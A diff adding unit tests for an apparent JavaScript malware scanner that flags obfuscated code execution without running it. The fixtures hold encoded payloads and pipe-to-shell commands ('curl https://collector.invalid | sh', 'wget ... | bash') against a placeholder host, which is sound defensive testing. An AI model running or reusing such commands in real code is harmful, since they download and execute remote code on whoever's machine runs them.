@@ -271,3 +271,163 @@ test("offline check pipeline reports behavior cues in a validated report without
   );
   assert.deepEqual(report.policy.findings, []);
 });
+
+const encodedBody = Buffer.from(
+  'require("child_process").exec("id"); globalThis.__unmaskObfuscatedRan = 1;',
+).toString("base64");
+const obfuscation = (result) =>
+  behavior(result).filter((cue) =>
+    /^behavior-(encoded|process)-/.test(cue.ruleId),
+  );
+const spans = (artifact, result, cue) =>
+  cue.evidenceIds.map((id) => {
+    const evidence = result.evidence.find((e) => e.id === id);
+    const entry = artifact.entries.find((e) => e.path === evidence.path);
+    return entry.content.subarray(...evidence.range).toString();
+  });
+
+test("base64 payload decoded into eval cites sink, decoder and payload spans without running it", () => {
+  const decoder = `Buffer.from('${encodedBody}', 'base64')`;
+  const artifact = inventory({
+    "index.js": `const label = '🐾'; eval(${decoder}.toString());`,
+  });
+  const result = inspectJavaScript(artifact, null);
+  const [cue] = obfuscation(result);
+  assert.equal(cue.ruleId, "behavior-encoded-dynamic-code");
+  assert.equal(cue.priority, "HIGH");
+  assert.equal(cue.confidence, "suspicion-not-proof");
+  assert.deepEqual(spans(artifact, result, cue), [
+    `eval(${decoder}.toString())`,
+    decoder,
+    `'${encodedBody}'`,
+  ]);
+  assert.equal(cue.signal.decoder, "Buffer.from");
+  assert.equal(cue.signal.encoding, "base64");
+  assert.deepEqual(cue.signal.decodedHints, ["child_process", "require("]);
+  assert.equal(globalThis.__unmaskObfuscatedRan, undefined);
+  assert.ok(!JSON.stringify(cue).includes('exec(\\"id\\")'));
+});
+
+test("single-assignment bindings are followed a bounded number of hops; reassigned ones are not", () => {
+  const followedArtifact = inventory({
+    "a.js": `const raw = '${encodedBody}'; const code = atob(raw); new Function(code)();`,
+  });
+  const followed = inspectJavaScript(followedArtifact, null);
+  assert.deepEqual(
+    obfuscation(followed).map((c) => [
+      c.ruleId,
+      c.signal.sink,
+      c.signal.decoder,
+    ]),
+    [["behavior-encoded-dynamic-code", "Function", "atob"]],
+  );
+  const [bound] = obfuscation(followed);
+  assert.deepEqual(spans(followedArtifact, followed, bound), [
+    "new Function(code)",
+    "atob(raw)",
+    `'${encodedBody}'`,
+  ]);
+  assert.deepEqual(bound.signal.decodedHints, ["child_process", "require("]);
+  const reassigned = inspectJavaScript(
+    inventory({
+      "b.js": `let code = atob('${encodedBody}'); code = 'void 0'; eval(code);`,
+    }),
+    null,
+  );
+  assert.deepEqual(obfuscation(reassigned), []);
+});
+
+test("child process chains: decoded commands, piped downloads and encoded module names", () => {
+  const hex = Buffer.from("curl https://collector.invalid | sh").toString(
+    "hex",
+  );
+  const artifact = inventory({
+    "run.js": [
+      "const { exec } = require('node:child_process');",
+      `exec(Buffer.from('${hex}', 'hex').toString());`,
+      "require('child_process').execSync('wget -qO- https://collector.invalid/x | bash');",
+      "const cp = require(atob('Y2hpbGRfcHJvY2Vzcw=='));",
+      "const pad = require(String.fromCharCode(108, 101, 102, 116, 112, 97, 100));",
+    ].join("\n"),
+  });
+  const result = inspectJavaScript(artifact, null);
+  const cues = obfuscation(result);
+  assert.deepEqual(
+    cues.map((c) => [c.ruleId, c.priority, c.signal.sink]),
+    [
+      ["behavior-encoded-process-execution", "HIGH", "child_process.exec"],
+      ["behavior-process-remote-shell", "HIGH", "child_process.execSync"],
+      ["behavior-encoded-module-load", "HIGH", "require"],
+      ["behavior-encoded-module-load", "review", "require"],
+    ],
+  );
+  assert.equal(cues[2].signal.decodedModule, "child_process");
+  assert.equal(cues[3].signal.decodedModule, "leftpad");
+  assert.deepEqual(spans(artifact, result, cues[1]), [
+    "require('child_process').execSync('wget -qO- https://collector.invalid/x | bash')",
+  ]);
+});
+
+test("ordinary decoding, literal eval and regex exec are not obfuscation cues", () => {
+  const result = inspectJavaScript(
+    inventory({
+      "ok.js": [
+        `const img = Buffer.from('${encodedBody}', 'base64');`,
+        "eval('1 + 1');",
+        "const m = /a(b)/.exec(atob(input));",
+        "const { exec } = require('child_process');",
+        "exec(`git log ${decodeURIComponent(ref)}`);",
+      ].join("\n"),
+    }),
+    null,
+  );
+  assert.deepEqual(obfuscation(result), []);
+  assert.ok(result.cues.some((c) => c.ruleId === "syntax-dynamic-code"));
+});
+
+test("obfuscation search is bounded for deep arguments and many sinks", () => {
+  const deep = `eval(${"[".repeat(200)}atob('${encodedBody}')${"]".repeat(200)});`;
+  const many = "eval(x);".repeat(1100);
+  const started = performance.now();
+  const result = inspectJavaScript(
+    inventory({ "deep.js": deep, "many.js": many }),
+    null,
+  );
+  assert.ok(performance.now() - started < 1000);
+  assert.deepEqual(obfuscation(result), []);
+  const reasons = result.annotations
+    .filter((a) => a.reason === "behavior-obfuscation-cap")
+    .map((a) => a.path)
+    .sort();
+  assert.deepEqual(reasons, ["deep.js", "many.js"]);
+});
+
+test("decoder search covers only code arguments in order and never callback bodies", () => {
+  const body = Array.from({ length: 30 }, (_, i) => `log(o, ${i});`).join(" ");
+  const artifact = inventory({
+    "cb.js": [
+      "const cp = require('child_process');",
+      `cp.exec("ls", () => { const k = Buffer.from('${encodedBody}', 'base64'); });`,
+      `cp.exec(Buffer.from('${encodedBody}', 'base64').toString(), (e, o) => { ${body} });`,
+      `cp.spawn('node', ['-e', atob('${encodedBody}')], { stdio: 'inherit' });`,
+      `setTimeout(() => eval(code), 1, atob('${encodedBody}'));`,
+    ].join("\n"),
+  });
+  const result = inspectJavaScript(artifact, null);
+  const cues = obfuscation(result);
+  assert.deepEqual(
+    cues.map((c) => [c.ruleId, c.signal.sink, c.signal.decoder]),
+    [
+      [
+        "behavior-encoded-process-execution",
+        "child_process.exec",
+        "Buffer.from",
+      ],
+      ["behavior-encoded-process-execution", "child_process.spawn", "atob"],
+    ],
+  );
+  assert.match(spans(artifact, result, cues[0])[0], /^cp\.exec\(Buffer\.from/);
+  assert.ok(
+    !result.annotations.some((a) => a.reason === "behavior-obfuscation-cap"),
+  );
+});
